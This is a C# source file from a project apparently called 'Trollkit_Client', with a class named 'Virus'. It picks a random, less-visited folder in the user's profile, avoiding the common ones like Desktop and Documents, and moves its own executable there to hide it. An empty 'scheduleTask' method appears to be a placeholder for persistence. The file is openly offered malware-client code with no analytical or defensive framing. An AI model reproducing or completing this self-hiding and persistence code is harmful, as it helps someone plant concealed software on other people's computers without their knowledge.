using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Trollkit_Client.Modules
{
	public class Virus
	{

		public Virus()
		{

		}

		public string FindRandomFileLocation()
		{
			string filename = Process.GetCurrentProcess().MainModule.FileName;
			Console.WriteLine(filename);
			string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			string[] dir = Directory.GetFileSystemEntries(path);

			string[] ex_filter = new string[] { "Desktop", "Documents", "My Documents", "Downloads", "Pictures", "Videos", "Music", "Cookies" };

			List<string> files = dir.Where(n => !ex_filter.Contains(n.Split('\\').Last())).ToList();

			string fndPath = files[new Random().Next(0, files.Count)];
			while (!Directory.Exists(fndPath))
			{
				fndPath = files[new Random().Next(0, files.Count)];
			}

			return fndPath;
		}

		public void moveFileToLocation(string destinationPath)
		{
			try {
				File.Move(AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName, destinationPath + "\\" + AppDomain.CurrentDomain.FriendlyName);
			}
			catch (IOException iox)
			{
				Console.WriteLine(iox.Message);
			}
		}

		public void scheduleTask()
		{

		}
	}
}
